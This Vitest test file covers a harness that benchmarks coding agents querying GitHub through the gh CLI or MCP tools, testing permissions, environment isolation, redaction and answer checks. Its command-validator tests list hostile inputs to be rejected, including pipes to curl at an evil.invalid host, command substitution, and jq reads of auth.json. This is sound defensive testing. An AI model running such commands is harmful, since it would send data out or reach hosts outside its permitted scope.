import {
  lstat,
  mkdtemp,
  readFile,
  readlink,
  realpath,
  rm,
  stat,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import { configSchema } from "../src/config.js";
import { inspectSubscription, redact } from "../src/credentials.js";
import { approvedCommand, EventCollector } from "../src/events.js";
import { answerMatches, githubHeaders, MCP_URL } from "../src/github.js";
import { agentConfig, attemptEnvironment, prepareAttempt } from "../src/opencode.js";
import { execute } from "../src/process.js";
import { prompt, schedule } from "../src/schedule.js";
import { saveJson } from "../src/storage.js";
import type { Expected, Technique, Trial } from "../src/types.js";

const config = configSchema.parse({
  repository: "fixture-owner/fixture-repo",
  branch: "feature/runtime-tests",
  opencodeVersion: "1.18.30",
  model: "openai/gpt-5.6-terra",
});
const techniques: Technique[] = ["bash", "mcp-raw", "mcp-filter", "mcp-filter-readonly"];
const workloads: Trial["workload"][] = ["task", "noop"];
const names = ["github_get_commit", "github_list_commits", "github_get_file_contents"];
const token = "synthetic-runtime-secret-not-a-real-token";
const expected: Expected = {
  sha: "0123456789abcdef0123456789abcdef01234567",
  subject: "Synthetic commit subject, not prompt context",
  committed_at: "2026-09-09T12:34:56Z",
  source_url:
    "https://github.com/fixture-owner/fixture-repo/commit/0123456789abcdef0123456789abcdef01234567",
};
const endpoint = `repos/${config.repository}/commits/main`;
const temporaryDirectories: string[] = [];

function trial(technique: Technique = "bash", workload: Trial["workload"] = "task"): Trial {
  return {
    id: `opencode-${technique}-${workload}-1`,
    agent: "opencode",
    technique,
    workload,
    repetition: 1,
  };
}

function toolEvent(tool: string, status = "completed", command?: string, id = "tool-1") {
  return JSON.stringify({
    type: "tool_use",
    sessionID: "session-1",
    timestamp: 123,
    part: { id, tool, state: { status, input: command === undefined ? {} : { command } } },
  });
}

async function temporaryDirectory(): Promise<string> {
  const directory = await mkdtemp(join(tmpdir(), "tool-context-bench-runtime-test-"));
  temporaryDirectories.push(directory);
  return directory;
}

afterEach(async () => {
  vi.unstubAllEnvs();
  await Promise.all(
    temporaryDirectories
      .splice(0)
      .map((directory) => rm(directory, { recursive: true, force: true })),
  );
});

describe("schedule and prompt", () => {
  it("limits pi to Bash in the 26-session suite schedule", () => {
    const trials = schedule(
      1,
      ["bash", "mcp-raw", "mcp-tuned", "tool-search"],
      1,
      ["claude", "codex", "opencode2", "pi"],
      "suite",
    );
    expect(trials).toHaveLength(26);
    expect(trials.filter((item) => item.agent === "pi").map((item) => item.technique)).toEqual([
      "bash",
      "bash",
    ]);
  });

  it("defaults to 24 unique trials, with all eight cells in each repetition", () => {
    expect(config.repeats).toBe(3);
    const trials = schedule(config.repeats, techniques, 42);
    expect(trials).toHaveLength(24);
    expect(new Set(trials.map((item) => item.id)).size).toBe(24);
    for (const repetition of [1, 2, 3]) {
      const block = trials.slice((repetition - 1) * 8, repetition * 8);
      expect(block).toHaveLength(8);
      for (const technique of techniques) {
        for (const workload of workloads) {
          expect(block).toContainEqual({
            id: `opencode-${technique}-${workload}-${repetition}`,
            agent: "opencode",
            technique,
            workload,
            repetition,
          });
        }
      }
    }
  });

  it("is deterministic by seed without mutating techniques or depending on input order", () => {
    const first = schedule(3, techniques, 42);
    expect(schedule(3, techniques, 42)).toEqual(first);
    expect(schedule(3, [...techniques].reverse(), 42)).toEqual(first);
    const other = schedule(3, techniques, 43);
    expect(other).not.toEqual(first);
    expect(other.map((item) => item.id).sort()).toEqual(first.map((item) => item.id).sort());
    expect(techniques).toEqual(["bash", "mcp-raw", "mcp-filter", "mcp-filter-readonly"]);
  });

  it.each(techniques)("supports a single technique: %s", (technique) => {
    const trials = schedule(2, [technique], 0);
    expect(trials).toHaveLength(4);
    expect(trials.every((item) => item.technique === technique)).toBe(true);
  });

  it.each(techniques)(
    "requests remote answer fields without injecting answers: %s",
    (technique) => {
      // Extra fixture fields must not become prompt context through object serialization.
      const context = { ...config, ...expected, token };
      const text = prompt(context, trial(technique));
      expect(text).toContain(config.repository);
      expect(text).toContain(config.branch);
      for (const field of ["sha", "subject", "committed_at", "source_url"])
        expect(text).toContain(field);
      for (const secret of [...Object.values(expected), token]) expect(text).not.toContain(secret);
      expect(text).toContain("Do not use a local repository or change any data.");
      expect(text).toContain(
        technique === "bash"
          ? "Use only gh CLI read commands"
          : "Use only the configured GitHub MCP tools",
      );
    },
  );

  it("uses the same exact no-tool prompt for every noop", () => {
    for (const item of schedule(1, techniques, 7).filter((item) => item.workload !== "task")) {
      expect(prompt(config, item)).toBe("Reply with exactly OK. Do not call any tools.");
    }
  });
});

describe("agentConfig and attemptEnvironment", () => {
  it.each(schedule(1, techniques, 0))(
    "disables auxiliary agents and compaction for $id",
    (item) => {
      const settings = agentConfig(config, item, names);
      expect(settings).toMatchObject({
        model: config.model,
        enabled_providers: ["openai"],
        default_agent: "bench",
        shell: "/bin/bash",
        autoupdate: false,
        share: "disabled",
        snapshot: false,
        lsp: false,
        formatter: false,
        instructions: [],
        subagent_depth: 0,
        compaction: { auto: false, prune: false },
        permission: { "*": "deny" },
        experimental: { openTelemetry: false, continue_loop_on_deny: false, batch_tool: false },
      });
      for (const name of ["build", "plan", "general", "explore", "title", "summary"]) {
        expect(settings.agent).toHaveProperty(name, { disable: true });
      }
      expect(settings.agent.bench).toMatchObject({ mode: "primary", steps: config.maxSteps });
      expect(settings.plugin).toEqual([]);
      expect(settings).not.toHaveProperty("provider.openai.options.apiKey");
      expect(JSON.stringify(settings)).not.toContain(token);
    },
  );

  it.each(workloads)(
    "exposes the entire raw catalog for %s, without embedding credentials",
    (workload) => {
      vi.stubEnv("BENCH_GITHUB_TOKEN", token);
      const settings = agentConfig(config, trial("mcp-raw", workload), names);
      expect(settings.agent.bench.permission).toEqual({
        "*": "deny",
        ...Object.fromEntries(names.map((name) => [name, "allow"])),
      });
      expect(settings.mcp).toEqual({
        github: {
          type: "remote",
          url: MCP_URL,
          enabled: true,
          oauth: false,
          timeout: 30000,
          headers: {
            Authorization: "Bearer {env:BENCH_GITHUB_TOKEN}",
          },
        },
      });
      expect(JSON.stringify(settings)).not.toContain(token);
      expect(githubHeaders("mcp-raw", token)).toEqual({
        Authorization: `Bearer ${token}`,
      });
    },
  );

  it("gives bash task and noop the same CLI exposure, but no MCP tools", () => {
    const settings = agentConfig(config, trial("bash"), names);
    expect(settings.mcp).toEqual({});
    expect(settings.agent.bench.permission).toEqual({
      "*": "deny",
      bash: {
        "*": "deny",
        "gh api *": "allow",
        "gh repo view *": "allow",
        "gh --help": "allow",
        "gh help *": "allow",
        "jq *": "allow",
      },
    });
    expect(agentConfig(config, trial("bash", "noop"), names)).toEqual(settings);
  });

  it("applies only the headers implied by each filtered technique", () => {
    expect(githubHeaders("mcp-filter", token)).toEqual({
      Authorization: `Bearer ${token}`,
      "X-MCP-Toolsets": "repos",
    });
    expect(githubHeaders("mcp-filter-readonly", token)).toEqual({
      Authorization: `Bearer ${token}`,
      "X-MCP-Toolsets": "repos",
      "X-MCP-Readonly": "true",
    });
    expect(agentConfig(config, trial("mcp-filter"), names).mcp).toMatchObject({
      github: { headers: githubHeaders("mcp-filter", "{env:BENCH_GITHUB_TOKEN}") },
    });
    expect(agentConfig(config, trial("mcp-filter-readonly"), names).mcp).toMatchObject({
      github: { headers: githubHeaders("mcp-filter-readonly", "{env:BENCH_GITHUB_TOKEN}") },
    });
    const exposed = [...names, "github_create_issue"];
    expect(
      agentConfig(config, trial("mcp-raw"), exposed).agent.bench.permission.github_create_issue,
    ).toBe("allow");
    const observed = new EventCollector(config, trial("mcp-raw"), exposed, token, names);
    observed.line(toolEvent("github_create_issue", "error"));
    expect(observed.invalidRoute).toBe(true);
  });

  it("isolates paths and excludes ambient provider credentials without disabling built-in OAuth plugins", () => {
    const sensitive = [
      "OPENAI_API_KEY",
      "OPENAI_BASE_URL",
      "OPENAI_ORG_ID",
      "ANTHROPIC_API_KEY",
      "GOOGLE_API_KEY",
      "GEMINI_API_KEY",
      "GOOGLE_APPLICATION_CREDENTIALS",
      "AWS_ACCESS_KEY_ID",
      "AWS_SECRET_ACCESS_KEY",
      "AWS_SESSION_TOKEN",
      "AWS_PROFILE",
      "AZURE_OPENAI_API_KEY",
      "GH_TOKEN",
      "GITHUB_TOKEN",
      "GH_ENTERPRISE_TOKEN",
      "GITHUB_ENTERPRISE_TOKEN",
      "BENCH_GITHUB_TOKEN",
      "OPENCODE_CONFIG_CONTENT",
      "OPENCODE_DISABLE_DEFAULT_PLUGINS",
      "NODE_OPTIONS",
      "BASH_ENV",
      "ENV",
      "HTTP_PROXY",
      "HTTPS_PROXY",
    ];
    for (const key of sensitive) vi.stubEnv(key, token);
    for (const key of [
      "HOME",
      "XDG_CONFIG_HOME",
      "XDG_DATA_HOME",
      "XDG_CACHE_HOME",
      "XDG_STATE_HOME",
      "TMPDIR",
      "PWD",
      "GH_CONFIG_DIR",
      "OPENCODE_CONFIG",
      "OPENCODE_DB",
    ]) {
      vi.stubEnv(key, "/synthetic/ambient-path");
    }
    const directory = join(tmpdir(), "synthetic-attempt-path");
    const env = attemptEnvironment(directory);
    for (const key of sensitive) expect(env, key).not.toHaveProperty(key);
    for (const [key, child] of Object.entries({
      HOME: "home",
      XDG_CONFIG_HOME: "config",
      XDG_DATA_HOME: "data",
      XDG_CACHE_HOME: "cache",
      XDG_STATE_HOME: "state",
      TMPDIR: "tmp",
      PWD: "work",
      GH_CONFIG_DIR: "gh",
      OPENCODE_CONFIG: "bench.json",
      OPENCODE_DB: "data/opencode/bench.db",
    }))
      expect(env[key], key).toBe(join(directory, child));
    expect(env).toMatchObject({
      GH_HOST: "github.com",
      GH_PROMPT_DISABLED: "1",
      SHELL: "/bin/bash",
      OPENCODE_PURE: "true",
      OPENCODE_DISABLE_PROJECT_CONFIG: "true",
      OPENCODE_DISABLE_CLAUDE_CODE: "true",
      OPENCODE_DISABLE_EXTERNAL_SKILLS: "true",
      OPENCODE_DISABLE_AUTOCOMPACT: "true",
      OPENCODE_DISABLE_PRUNE: "true",
      OPENCODE_DISABLE_AUTOUPDATE: "true",
      OPENCODE_DISABLE_MODELS_FETCH: "true",
    });
    expect(JSON.stringify(env)).not.toContain(token);
    expect(process.env.OPENAI_API_KEY).toBe(token);
  });
});

describe("approvedCommand", () => {
  // These strings are parsed only. Never execute commands from these tables.
  it.each([
    "gh --help",
    "gh help api",
    "gh api --help",
    `gh api ${endpoint}`,
    `gh api /${endpoint}`,
    `gh api '${endpoint}' --method GET`,
    `gh api "${endpoint}" -X GET`,
    `gh api ${endpoint} --method=GET`,
    `gh api ${endpoint} -XGET`,
    `gh api --jq '.commit.message | split("\\n")[0]' ${endpoint}`,
    `gh api ${endpoint} | jq -r '.sha'`,
    `gh api ${endpoint} | jq '{sha: .sha, subject: .commit.message}' | jq -c .`,
    `gh api ${endpoint} | jq --arg label 'two words' '. + {label: $label}'`,
    `gh api ${endpoint} | jq --arg label two\\ words '. + {label: $label}'`,
    `gh api ${endpoint} | jq --arg literal '\${HOME}' '. + {literal: $literal}'`,
    `gh repo view ${config.repository} --json name,url`,
    `gh repo view '${config.repository}' --json name --jq '.name'`,
    'echo -n "0123456789abcdef" | wc -c',
  ])("accepts read-only shell syntax: %s", (command) => {
    expect(approvedCommand(command, config.repository)).toBe(true);
  });

  it.each([
    "",
    " ",
    "jq .",
    "git log -1",
    "curl https://github.com",
    "gh auth status",
    "gh auth login",
    "gh repo clone fixture-owner/fixture-repo",
    "gh api user",
    "gh api repos/other-owner/other-repo/commits/main",
    `gh api repos/${config.repository}-other/commits/main`,
    "gh repo view other-owner/other-repo",
    "gh repo view",
    `gh api https://api.github.com/${endpoint}`,
    `gh api https://evil.invalid/${endpoint}`,
    `gh api https://evil.invalid/ --jq '${endpoint}'`,
    `gh api https://api.github.com/repos/other-owner/other-repo/commits/main --jq '${endpoint}'`,
    `gh api ${endpoint} https://evil.invalid/`,
    `gh api ${endpoint} --hostname evil.invalid`,
    `gh api ${endpoint} --hostname=evil.invalid`,
    `gh api repos/${config.repository}/../other/commits`,
    `gh api repos/${config.repository}/%2e%2e/other/commits`,
    `gh api ${endpoint} -X POST`,
    `gh api ${endpoint} --method PATCH`,
    `gh api ${endpoint} --method=DELETE`,
    `gh api ${endpoint} -XPUT`,
    `gh api ${endpoint} -X`,
    `gh api ${endpoint} -f title=value`,
    `gh api ${endpoint} -F title=value`,
    `gh api ${endpoint} -ftitle=value`,
    `gh api ${endpoint} -Ftitle=value`,
    `gh api ${endpoint} --field title=value`,
    `gh api ${endpoint} --raw-field title=value`,
    `gh api ${endpoint} --field=title=value`,
    `gh api ${endpoint} --raw-field=title=value`,
    `gh api ${endpoint} --input payload.json`,
    `gh api ${endpoint} --input=payload.json`,
    `gh api ${endpoint} -X GET -f title=value`,
    `gh api ${endpoint} > output.json`,
    `gh api ${endpoint} >> output.json`,
    `gh api ${endpoint} < input.json`,
    `gh api ${endpoint} 2>&1`,
    `gh api ${endpoint}; gh auth logout`,
    `gh api ${endpoint} && git log`,
    `gh api ${endpoint} || curl https://evil.invalid`,
    `gh api ${endpoint} &`,
    `gh api ${endpoint}\ngh auth logout`,
    `gh api ${endpoint} | curl https://evil.invalid`,
    `gh api ${endpoint} | git log`,
    `gh api ${endpoint} |`,
    `gh api ${endpoint} | jq -f script.jq`,
    `gh api ${endpoint} | jq --from-file script.jq`,
    `gh api ${endpoint} | jq --rawfile secret auth.json .`,
    `gh api ${endpoint} | jq --slurpfile secret auth.json .`,
    `gh api ${endpoint} | jq --argfile secret auth.json .`,
    `gh api ${endpoint} | jq --from-file=script.jq`,
    `gh api ${endpoint} | jq -fscript.jq`,
    `gh api ${endpoint} | jq . auth.json`,
    `GH_HOST=evil.invalid gh api ${endpoint}`,
    `env gh api ${endpoint}`,
    `gh api ${endpoint}/$HOME`,
    `gh api "${endpoint}/\${HOME}"`,
    `gh api ${endpoint}/$(whoami)`,
    `gh api ${endpoint}/\`whoami\``,
    `gh api ${endpoint} --jq "$FILTER"`,
    `gh api '${endpoint}`,
    `gh api "${endpoint}`,
    `gh api ${endpoint} \\`,
    `gh api ${endpoint}\\; gh auth logout`,
  ])("rejects unsafe, foreign, or malformed commands: %s", (command) => {
    expect(approvedCommand(command, config.repository)).toBe(false);
  });

  it("rejects commands that exceed the parser length limit", () => {
    expect(
      approvedCommand(`gh api ${endpoint} --jq '${"x".repeat(16_000)}'`, config.repository),
    ).toBe(false);
  });
});

describe("EventCollector", () => {
  it.each(schedule(1, techniques, 0).filter((item) => item.workload !== "task"))(
    "accepts no tools and rejects a tool for $id",
    (item) => {
      const collector = new EventCollector(config, item, names, token);
      collector.line(" \t");
      collector.line(
        JSON.stringify({
          type: "text",
          sessionID: "session-1",
          part: { id: "text-1", text: "OK" },
        }),
      );
      expect(collector.answer).toBe("OK");
      expect(collector.tools).toEqual([]);
      expect(collector.routeValid).toBe(true);
      collector.line(
        toolEvent(
          item.technique === "bash" ? "bash" : "github_get_commit",
          "completed",
          `gh api ${endpoint}`,
        ),
      );
      expect(collector.invalidRoute).toBe(true);
      expect(collector.routeValid).toBe(false);
    },
  );

  it.each(techniques)("requires a completed tool on the correct route: %s", (technique) => {
    const collector = new EventCollector(config, trial(technique), names, token);
    expect(collector.routeValid).toBe(false);
    collector.line(
      toolEvent(
        technique === "bash" ? "bash" : "github_get_commit",
        "error",
        `gh api ${endpoint}`,
        "failed",
      ),
    );
    expect(collector.routeValid).toBe(false);
    collector.line(
      toolEvent(
        technique === "bash" ? "bash" : "github_get_commit",
        "completed",
        `gh api ${endpoint}`,
        "success",
      ),
    );
    expect(collector.routeValid).toBe(true);
    expect(collector.tools.map((tool) => tool.status)).toEqual(["error", "completed"]);
    expect(collector.sessionID).toBe("session-1");
  });

  it.each([
    { technique: "bash", tool: "github_get_commit", command: `gh api ${endpoint}` },
    { technique: "bash", tool: "bash", command: "git log -1" },
    { technique: "bash", tool: "bash", command: undefined },
    { technique: "mcp-raw", tool: "bash", command: `gh api ${endpoint}` },
    { technique: "mcp-raw", tool: "github_unlisted_tool", command: undefined },
  ] satisfies { technique: Technique; tool: string; command: string | undefined }[])(
    "keeps an invalid route invalid after a valid call: $technique/$tool/$command",
    ({ technique, tool, command }) => {
      const collector = new EventCollector(config, trial(technique), names, token);
      collector.line(toolEvent(tool, "completed", command));
      collector.line(
        toolEvent(
          technique === "bash" ? "bash" : "github_get_commit",
          "completed",
          `gh api ${endpoint}`,
          "valid",
        ),
      );
      expect(collector.invalidRoute).toBe(true);
      expect(collector.routeValid).toBe(false);
    },
  );

  it.each([
    "not json",
    "null",
    "[]",
    "{}",
    '{"type":2}',
    '{"type":"text","part":[]}',
    '{"type":"text","sessionID":1}',
    '{"type":"text","timestamp":"now"}',
  ])("marks malformed input without exporting it: %s", (line) => {
    const collector = new EventCollector(config, trial(), names, token);
    collector.line(line);
    collector.line(toolEvent("bash", "completed", `gh api ${endpoint}`));
    expect(collector.malformed).toBe(true);
    expect(collector.routeValid).toBe(false);
    expect(collector.safeEvents).toHaveLength(1);
  });

  it.each([null, "invalid", {}, { status: 5, input: [] }])(
    "handles malformed tool states: %j",
    (state) => {
      const collector = new EventCollector(config, trial(), names, token);
      collector.line(
        JSON.stringify({ type: "tool_use", part: { id: "bad-state", tool: "bash", state } }),
      );
      expect(collector.tools).toEqual([{ name: "bash", status: "unknown" }]);
      expect(collector.routeValid).toBe(false);
    },
  );

  it("rejects mixed sessions even when duplicate event IDs are used", () => {
    const collector = new EventCollector(config, trial(), names, token);
    collector.line(toolEvent("bash", "completed", `gh api ${endpoint}`));
    collector.line(
      JSON.stringify({
        type: "tool_use",
        sessionID: "session-2",
        part: { id: "tool-1", tool: "bash" },
      }),
    );
    expect(collector.malformed).toBe(true);
    expect(collector.routeValid).toBe(false);
  });

  it("deduplicates by event type and part ID, without dropping separate text parts", () => {
    const collector = new EventCollector(config, trial(), names, token);
    const tool = toolEvent("bash", "completed", `gh api ${endpoint}`, "shared");
    const text = JSON.stringify({ type: "text", part: { id: "shared", text: "first " } });
    for (const line of [tool, tool, text, text]) collector.line(line);
    collector.line(JSON.stringify({ type: "text", part: { id: "second", text: "second" } }));
    expect(collector.tools).toHaveLength(1);
    expect(collector.answer).toBe("first second");
    expect(collector.safeEvents).toHaveLength(3);
  });

  it("reports errors without exporting raw error details", () => {
    const collector = new EventCollector(config, trial(), names, token);
    collector.line(JSON.stringify({ type: "error", error: { message: `PRIVATE ERROR ${token}` } }));
    expect(collector.error).toBe(true);
    expect(collector.warnings).toHaveLength(1);
    expect(collector.warnings.join(" ")).toContain("error");
    expect(
      JSON.stringify({ warnings: collector.warnings, events: collector.safeEvents }),
    ).not.toContain("PRIVATE ERROR");
    expect(collector.routeValid).toBe(false);
  });

  it.each(["code_mode", "execute_code", "executor"])("detects code mode: %s", (tool) => {
    const collector = new EventCollector(config, trial("mcp-raw"), names, token);
    collector.line(toolEvent(tool));
    expect(collector.codeMode).toBe(true);
    expect(collector.routeValid).toBe(false);
  });

  it("redacts answers and commands and exports only event metadata", () => {
    const collector = new EventCollector(config, trial(), names, token);
    const secrets = [
      token,
      "ghp_synthetic123",
      "github_pat_synthetic123",
      "sk-synthetic123",
      "opaque-bearer-value",
    ];
    collector.line(
      JSON.stringify({
        type: "text",
        sessionID: "session-1",
        timestamp: 123,
        part: {
          id: "text-1",
          text: `\u001b[31m${secrets.slice(0, 4).join(" ")} Bearer ${secrets[4]}\u001b[0m\u0000`,
        },
      }),
    );
    collector.line(
      JSON.stringify({
        type: "tool_use",
        sessionID: "session-1",
        timestamp: 124,
        part: {
          id: "tool-1",
          tool: "bash",
          state: {
            status: "completed",
            input: { command: `gh api ${endpoint} --jq '${token}'`, private: token },
            output: `PRIVATE OUTPUT ${token}`,
          },
        },
      }),
    );
    const exported = JSON.stringify({
      answer: collector.answer,
      tools: collector.tools,
      events: collector.safeEvents,
      warnings: collector.warnings,
    });
    for (const secret of secrets) expect(exported).not.toContain(secret);
    expect(exported).not.toContain("PRIVATE OUTPUT");
    expect(collector.answer).toContain("[REDACTED]");
    expect(collector.answer).not.toContain("\u001b");
    expect(collector.answer).not.toContain("\u0000");
    expect(collector.tools[0]?.command).toContain("[REDACTED]");
    expect(collector.safeEvents).toEqual([
      { type: "text", sessionID: "session-1", timestamp: 123, partID: "text-1" },
      { type: "tool_use", sessionID: "session-1", timestamp: 124, partID: "tool-1" },
    ]);
  });
});

describe("answerMatches and redact", () => {
  it.each([
    JSON.stringify(expected),
    `  ${JSON.stringify(expected)}\n`,
    `\`\`\`json\n${JSON.stringify(expected)}\n\`\`\``,
    `\`\`\`\n${JSON.stringify(expected)}\n\`\`\``,
    JSON.stringify({ ...expected, committed_at: "2026-09-09T14:34:56+02:00" }),
    `Answer: ${JSON.stringify(expected)}`,
  ])("accepts the exact answer and equivalent timestamp: %s", (text) => {
    expect(answerMatches(text, expected)).toBe(true);
  });

  it.each([
    { sha: expected.sha.slice(0, 7) },
    { sha: "f".repeat(40) },
    { sha: expected.sha.toUpperCase() },
    { subject: `${expected.subject}\nbody` },
    { subject: `${expected.subject} ` },
    { committed_at: "2026-09-09T12:34:57Z" },
    { committed_at: "invalid date" },
    { source_url: expected.source_url.replace("fixture-owner", "other-owner") },
    { source_url: `${expected.source_url}/` },
    { source_url: "not a URL" },
  ])("rejects a wrong answer field: %j", (change) => {
    expect(answerMatches(JSON.stringify({ ...expected, ...change }), expected)).toBe(false);
  });

  it.each(Object.keys(expected))("requires field %s", (missing) => {
    const answer = Object.fromEntries(Object.entries(expected).filter(([key]) => key !== missing));
    expect(answerMatches(JSON.stringify(answer), expected)).toBe(false);
  });

  it.each([
    "",
    "OK",
    "null",
    "[]",
    "{}",
    "{",
    `${JSON.stringify(expected)}\n${JSON.stringify(expected)}`,
  ])("rejects malformed or non-JSON answers: %s", (text) =>
    expect(answerMatches(text, expected)).toBe(false),
  );

  it("redacts all explicit occurrences and token prefixes, preserving ordinary Unicode and newlines", () => {
    expect(redact("/tmp/claude-bash-task-1/work")).toBe("/tmp/claude-bash-task-1/work");
    const text = `${token} ${token} ghp_fake gho_fake ghu_fake ghs_fake ghr_fake github_pat_fake sk-fake bearer opaque\nCaf\u00e9 \ud83d\ude80`;
    expect(redact(text, [token, ""])).toBe(
      `${Array.from({ length: 9 }, () => "[REDACTED]").join(" ")} Bearer [REDACTED]\nCaf\u00e9 \ud83d\ude80`,
    );
  });
});

describe("prepareAttempt", () => {
  it("uses a synthetic OAuth symlink, private config and directories, and leaves the target intact on cleanup", async () => {
    const root = await temporaryDirectory();
    const auth = join(root, "synthetic-auth.json");
    const syntheticAuth = {
      openai: { type: "oauth", refresh: token, access: "synthetic-access", expires: 0 },
    };
    await saveJson(auth, syntheticAuth);
    await inspectSubscription(auth);
    const original = await readFile(auth, "utf8");
    const directory = join(root, "attempt");
    const prepared = await prepareAttempt(directory, auth, config, trial("mcp-raw"), names);
    const link = join(directory, "data", "opencode", "auth.json");
    expect((await lstat(link)).isSymbolicLink()).toBe(true);
    expect(await readlink(link)).toBe(auth);
    expect(await readFile(link, "utf8")).toBe(original);
    expect(prepared).toEqual({
      directory,
      database: join(directory, "data", "opencode", "bench.db"),
      env: attemptEnvironment(directory),
      cwd: join(directory, "work"),
    });
    for (const child of [
      "",
      "home",
      "config",
      "data",
      "data/opencode",
      "cache",
      "state",
      "tmp",
      "work",
      "gh",
    ]) {
      const info = await stat(join(directory, child));
      expect(info.isDirectory()).toBe(true);
      expect(info.mode & 0o777).toBe(0o700);
    }
    const path = join(directory, "bench.json");
    expect((await stat(path)).mode & 0o777).toBe(0o600);
    const stored = await readFile(path, "utf8");
    const parsed: unknown = JSON.parse(stored);
    expect(parsed).toEqual(agentConfig(config, trial("mcp-raw"), names));
    expect(stored).not.toContain(token);
    expect(stored).not.toContain("synthetic-access");
    expect(stored).toContain("{env:BENCH_GITHUB_TOKEN}");
    await rm(directory, { recursive: true, force: true });
    await expect(lstat(directory)).rejects.toMatchObject({ code: "ENOENT" });
    expect((await lstat(auth)).isFile()).toBe(true);
    expect(await readFile(auth, "utf8")).toBe(original);
  });

  it.each([
    "not json",
    JSON.stringify({}),
    JSON.stringify({ openai: { type: "api", key: token } }),
    JSON.stringify({ openai: { type: "oauth", refresh: "" } }),
    JSON.stringify({
      openai: { type: "oauth", refresh: token },
      remote: { type: "wellknown", key: token },
    }),
  ])("rejects invalid synthetic auth without exposing its contents: %s", async (contents) => {
    const directory = await temporaryDirectory();
    const auth = join(directory, "invalid-auth.json");
    await writeFile(auth, contents, { mode: 0o600 });
    await expect(inspectSubscription(auth)).rejects.toThrow(
      "Expected an existing OpenCode OpenAI OAuth login and no remote-config auth entries. Auth values were not displayed.",
    );
  });
});

describe("execute (local Node children only)", () => {
  it("captures stdin, cwd, stdout, stderr, exit status, and a final line without a newline", async () => {
    const directory = await temporaryDirectory();
    const lines: string[] = [];
    const result = await execute(
      process.execPath,
      [
        "-e",
        `
      let input = '';
      process.stdin.setEncoding('utf8');
      process.stdin.on('data', chunk => { input += chunk; });
      process.stdin.on('end', () => {
        process.stdout.write(JSON.stringify({ input, cwd: process.cwd(), marker: process.env.RUNTIME_TEST_MARKER }) + '\\nfinal');
        process.stderr.write('synthetic stderr');
        process.exitCode = 7;
      });
    `,
      ],
      {
        cwd: directory,
        input: "Caf\u00e9 \ud83d\ude80\n",
        env: { RUNTIME_TEST_MARKER: "isolated" },
        onLine: (line) => {
          lines.push(line);
        },
      },
    );
    expect(result).toMatchObject({ code: 7, stopped: false, stderr: "synthetic stderr" });
    expect(lines).toHaveLength(2);
    const captured: unknown = JSON.parse(lines[0] ?? "null");
    // macOS can resolve /var to /private/var in process.cwd().
    expect(captured).toEqual({
      input: "Caf\u00e9 \ud83d\ude80\n",
      cwd: await realpath(directory),
      marker: "isolated",
    });
    expect(lines[1]).toBe("final");
    expect(result.stdout).toBe(`${lines[0]}\nfinal`);
  });

  it("does not inherit ambient credentials with the default process environment", async () => {
    vi.stubEnv("OPENAI_API_KEY", token);
    vi.stubEnv("GH_TOKEN", token);
    const result = await execute(process.execPath, [
      "-e",
      "process.stdout.write(JSON.stringify({ openai: process.env.OPENAI_API_KEY, github: process.env.GH_TOKEN, shell: process.env.SHELL }))",
    ]);
    expect(result.code).toBe(0);
    const captured: unknown = JSON.parse(result.stdout);
    expect(captured).toEqual({ shell: "/bin/bash" });
  });

  it("marks a timed-out process stopped and retains output captured before the timeout", async () => {
    const result = await execute(
      process.execPath,
      ["-e", "process.stdout.write('ready\\n'); setInterval(() => {}, 1000)"],
      { timeoutMs: 1000 },
    );
    expect(result.stopped).toBe(true);
    expect(result.stdout).toBe("ready\n");
    expect(result.code).not.toBe(0);
  });

  it("cancels a running process on AbortSignal without waiting for the timeout", async () => {
    const controller = new AbortController();
    const result = await execute(
      process.execPath,
      ["-e", "process.stdout.write('ready\\n'); setInterval(() => {}, 1000)"],
      {
        signal: controller.signal,
        timeoutMs: 2000,
        onLine: (line) => {
          if (line === "ready") controller.abort();
        },
      },
    );
    expect(controller.signal.aborted).toBe(true);
    expect(result.stopped).toBe(true);
    expect(result.stdout).toBe("ready\n");
    expect(result.code).not.toBe(0);
  });

  it("honors an already aborted signal", async () => {
    const controller = new AbortController();
    controller.abort();
    const result = await execute(process.execPath, ["-e", "setInterval(() => {}, 1000)"], {
      signal: controller.signal,
      timeoutMs: 2000,
    });
    expect(result.stopped).toBe(true);
    expect(result.code).not.toBe(0);
  });

  it("stops on the shared stdout/stderr byte limit", async () => {
    const result = await execute(
      process.execPath,
      [
        "-e",
        "process.stdout.write('x'.repeat(64)); process.stderr.write('y'.repeat(64)); setInterval(() => {}, 1000)",
      ],
      { maxBytes: 32, timeoutMs: 2000 },
    );
    expect(result.stopped).toBe(true);
    expect(Buffer.byteLength(result.stdout) + Buffer.byteLength(result.stderr)).toBeLessThanOrEqual(
      32,
    );
  });

  it("stops safely if the line callback throws", async () => {
    const result = await execute(
      process.execPath,
      ["-e", "process.stdout.write('ready\\n'); setInterval(() => {}, 1000)"],
      {
        timeoutMs: 2000,
        onLine: () => {
          throw new Error("synthetic callback failure");
        },
      },
    );
    expect(result.stopped).toBe(true);
    expect(result.stdout).toBe("ready\n");
  });

  it("rejects a missing executable without exporting its private parent path", async () => {
    const directory = await temporaryDirectory();
    await expect(execute(join(directory, "missing-runtime-test-executable"), [])).rejects.toThrow(
      "Cannot start missing-runtime-test-executable.",
    );
  });

  it("preserves UTF-8 characters split across stdout and stderr chunks", async () => {
    const lines: string[] = [];
    const result = await execute(
      process.execPath,
      [
        "-e",
        `
      const bytes = Buffer.from('Caf\\u00e9 \\ud83d\\ude80\\nlast');
      process.stdout.write(bytes.subarray(0, 4));
      process.stderr.write(bytes.subarray(0, 8));
      setTimeout(() => {
        process.stdout.write(bytes.subarray(4));
        process.stderr.write(bytes.subarray(8));
      }, 100);
    `,
      ],
      {
        onLine: (line) => {
          lines.push(line);
        },
      },
    );
    expect(result.stopped).toBe(false);
    expect(result.code).toBe(0);
    expect(result).toMatchObject({
      stdout: "Caf\u00e9 \ud83d\ude80\nlast",
      stderr: "Caf\u00e9 \ud83d\ude80\nlast",
    });
    expect(lines).toEqual(["Caf\u00e9 \ud83d\ude80", "last"]);
  });
});
